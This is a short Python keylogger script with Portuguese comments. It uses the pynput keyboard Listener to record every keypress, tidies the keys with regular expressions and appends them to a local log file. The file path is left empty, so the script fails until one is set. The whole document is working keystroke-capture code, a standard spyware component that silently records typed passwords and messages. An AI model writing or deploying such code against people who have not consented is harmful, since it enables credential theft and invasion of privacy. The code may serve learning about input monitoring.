from pynput.keyboard import Listener ##importando modulo listener - para 'ouvir' a captura das teclas
import re ##importando biblioteca - regular expression 

file_log = "" ##caminho do arquivo .log

def capture(keycap):  ##funcao para regular expressoes do log 
    keycap = str(keycap) ##convertendo teclas em string
    keycap = re.sub(r"\'", "",keycap) ##removendo aspas da output
    keycap = re.sub(r"Key.space", " ",keycap)##removendo da output 'key.space' para literalmente um 'space' no log
    keycap = re.sub(r"Key.enter", "\n",keycap)##removendo output 'key.enter' para uma quebra de linha '\n'
    keycap = re.sub(r"Key.*", '',keycap)##removendo todas funcoes restante do log - clean log 
    
    with open(file_log, "a") as log: ##funcao para escrever as teclas no arquivo de log
        log.write(keycap)

with Listener(on_press=capture) as l: 
    l.join()    